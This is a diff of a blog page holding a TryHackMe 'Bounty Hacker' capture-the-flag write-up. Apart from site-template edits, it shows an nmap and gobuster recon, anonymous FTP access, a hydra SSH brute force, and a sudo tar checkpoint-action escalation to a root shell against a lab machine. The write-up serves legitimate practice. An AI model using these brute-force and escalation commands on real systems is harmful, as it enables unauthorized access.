@@ -6,11 +6,11 @@
 <title>THM: Bounty Hacker</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="generator" content="Org Mode" />
-<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet"><script src="/src/copy-pre.min.js"></script><script src="/src/theme-switcher.min.js" defer></script><link rel="stylesheet" href="/src/rougier.min.css" /><link rel="icon" type="image/x-icon" href="/src/favicon.ico"><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="/src/copy-pre.min.js"></script><script src="/src/theme-switcher.min.js" defer></script><script src="/src/nav.min.js" defer></script><link href="/pagefind/pagefind-ui.css" rel="stylesheet"><script src="/pagefind/pagefind-ui.js"></script><script src="/src/search.min.js" defer></script><link rel="stylesheet" href="/src/rougier.min.css" /><link rel="icon" type="image/x-icon" href="/src/favicon.ico"><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
 <div id="preamble" class="status">
-<div id="org-div-home-and-up"><a accesskey="H" href="/index.html"> HOME </a> | <button id="theme-toggle" title="Toggle theme">🌓</button></div>
+<nav class="site-nav"> <div class="nav-header"> <a href="/" class="logo" aria-label="Home"> <span class="site-title">Chasing Simplicity</span> </a> <button id="menu-toggle" aria-label="Toggle menu"> <span class="hamburger"></span> </button> </div> <ul id="nav-menu"> <li><a href="/posts/recents.html" class="active">archive</a></li> <li><a href="/tags/index.html">tags</a></li> <li><a href="/posts/books.html">reading list</a></li> <li><a href="/posts/about.html">about</a></li> <li class="search-item"> <div id="search"></div> </li> <li class="theme-item"> <button id="theme-toggle" aria-label="Toggle theme">dark mode</button> </li> </ul> </nav>
 </div>
 <div id="content" class="content">
 <h1 class="title">THM: Bounty Hacker</h1>
@@ -18,12 +18,12 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org7736998">Recon</a></li>
-<li><a href="#org16f2bc2">The Website</a></li>
-<li><a href="#org5e2110d">The FTP server</a></li>
-<li><a href="#orge3abe99">The SSH server</a></li>
-<li><a href="#org7a517e4">Privilege Escalation</a></li>
-<li><a href="#orgc424f11">Conclusion</a></li>
+<li><a href="#orgd975ba6">Recon</a></li>
+<li><a href="#org8c46851">The Website</a></li>
+<li><a href="#orgc17aab9">The FTP server</a></li>
+<li><a href="#org27b727a">The SSH server</a></li>
+<li><a href="#org4f119ea">Privilege Escalation</a></li>
+<li><a href="#org5023963">Conclusion</a></li>
 </ul>
 </div>
 </div>
@@ -43,14 +43,14 @@ boring at times.
 That&rsquo;s the reason why I now am here (even though I suppose that taking
 on a medium difficulty room instead of an easy one would be better)!
 </p>
-<div id="outline-container-org7736998" class="outline-2">
-<h2 id="org7736998"><a href="#org7736998">Recon</a></h2>
-<div class="outline-text-2" id="text-org7736998">
+<div id="outline-container-orgd975ba6" class="outline-2">
+<h2 id="orgd975ba6"><a href="#orgd975ba6">Recon</a></h2>
+<div class="outline-text-2" id="text-orgd975ba6">
 <p>
 Like always: a quick <code>nmap</code> scan
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org43b1e8d"><span class="org-variable-name">IP</span>=10.10.61.63
+<pre class="src src-bash" id="org0c1af6a"><span class="org-variable-name">IP</span>=10.10.61.63
 nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
 </pre>
 </div>
@@ -70,14 +70,14 @@ missed anything, we visit the website.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org7d82cc3">nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
+<pre class="src src-bash" id="org7dfa28e">nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org16f2bc2" class="outline-2">
-<h2 id="org16f2bc2"><a href="#org16f2bc2">The Website</a></h2>
-<div class="outline-text-2" id="text-org16f2bc2">
+<div id="outline-container-org8c46851" class="outline-2">
+<h2 id="org8c46851"><a href="#org8c46851">The Website</a></h2>
+<div class="outline-text-2" id="text-org8c46851">
 <p>
 First things first, after visiting the website it looks like its a
 simple static website, comprised of just one html page, in which
@@ -89,14 +89,14 @@ getting into the target system to us. Nothing is hidden in the html.
 Gobuster also did not reveal any promising files.
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="orgb6651d8">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.61.63
+<pre class="src src-bash" id="org6dd5834">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.61.63
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org5e2110d" class="outline-2">
-<h2 id="org5e2110d"><a href="#org5e2110d">The FTP server</a></h2>
-<div class="outline-text-2" id="text-org5e2110d">
+<div id="outline-container-orgc17aab9" class="outline-2">
+<h2 id="orgc17aab9"><a href="#orgc17aab9">The FTP server</a></h2>
+<div class="outline-text-2" id="text-orgc17aab9">
 <p>
 Using the standard command we can visit the ftp server as <code>anonymous</code>.
 </p>
@@ -104,7 +104,7 @@ Using the standard command we can visit the ftp server as <code>anonymous</code>
 <p>
 If performing any commands returns:
 </p>
-<pre class="example" id="org0162e87">
+<pre class="example" id="org364c4d5">
 530 Please login with USER and PASS.
 </pre>
 <p>
@@ -124,15 +124,15 @@ small <i>flag</i></li>
 </ul>
 </div>
 </div>
-<div id="outline-container-orge3abe99" class="outline-2">
-<h2 id="orge3abe99"><a href="#orge3abe99">The SSH server</a></h2>
-<div class="outline-text-2" id="text-orge3abe99">
+<div id="outline-container-org27b727a" class="outline-2">
+<h2 id="org27b727a"><a href="#org27b727a">The SSH server</a></h2>
+<div class="outline-text-2" id="text-org27b727a">
 <p>
 Trying our luck with the wordlist found above, eventually gives us the
 password for the user <code>lin</code>
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org02b93bc">hydra -l lin -P locks.txt ssh://$<span class="org-variable-name">IP</span> -t 1
+<pre class="src src-bash" id="org9baafec">hydra -l lin -P locks.txt ssh://$<span class="org-variable-name">IP</span> -t 1
 </pre>
 </div>
 
@@ -142,9 +142,9 @@ machine, and by visiting lin&rsquo;s Desktop, we get the first actual flag.
 </p>
 </div>
 </div>
-<div id="outline-container-org7a517e4" class="outline-2">
-<h2 id="org7a517e4"><a href="#org7a517e4">Privilege Escalation</a></h2>
-<div class="outline-text-2" id="text-org7a517e4">
+<div id="outline-container-org4f119ea" class="outline-2">
+<h2 id="org4f119ea"><a href="#org4f119ea">Privilege Escalation</a></h2>
+<div class="outline-text-2" id="text-org4f119ea">
 <p>
 Just running <code>sudo -l</code> shows that we can run <code>/bin/tar</code> as root.
 </p>
@@ -155,14 +155,14 @@ privileges in no time:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="orga9c14ac">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="org-variable-name">exec</span>=/bin/sh
+<pre class="src src-bash" id="orgaa82da1">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="org-variable-name">exec</span>=/bin/sh
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-orgc424f11" class="outline-2">
-<h2 id="orgc424f11"><a href="#orgc424f11">Conclusion</a></h2>
-<div class="outline-text-2" id="text-orgc424f11">
+<div id="outline-container-org5023963" class="outline-2">
+<h2 id="org5023963"><a href="#org5023963">Conclusion</a></h2>
+<div class="outline-text-2" id="text-org5023963">
 <p>
 It was a nice room, arguably a wrong choice for me, but a good place
 to start I suppose, covering a little bit of the basics. 
@@ -171,7 +171,7 @@ to start I suppose, covering a little bit of the basics.
 </div>
 </div>
 <div id="postamble" class="status">
-<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async></script><p class="date footer"> Originally created on 2023-11-05 Sun 21:54</p><p class="footer footer-text">Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.<br>© 2025 Lamprinos Chatziioannou. <a href="https://github.com/chatziiola/chatziiola.github.io/blob/main/LICENSE">Content may be shared with attribution</a>.</p><p class="footer footer-social" ><a href="https://github.com/chatziiola"><i class="fa-brands fa-github"></i></a><a href="https://www.linkedin.com/in/chatziiola"> <i class="fa-brands fa-linkedin"></i></a><a href="/posts/rss.xml"> <i class="fa-solid fa-rss"></i> </a></p>
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async></script><p class="date footer"> Originally created on 2023-11-05 Sun 21:54</p><p class="footer footer-text">Made with Emacs and Org.<br>© 2026 Lamprinos Chatziioannou. <a href="https://github.com/chatziiola/chatziiola.github.io/blob/main/LICENSE">Content may be shared with attribution</a>.</p><p class="footer footer-social" ><a href="https://github.com/chatziiola"><i class="fa-brands fa-github"></i></a><a href="https://www.linkedin.com/in/chatziiola"> <i class="fa-brands fa-linkedin"></i></a><a href="/posts/rss.xml"> <i class="fa-solid fa-rss"></i> </a></p>
 </div>
 </body>
 </html>
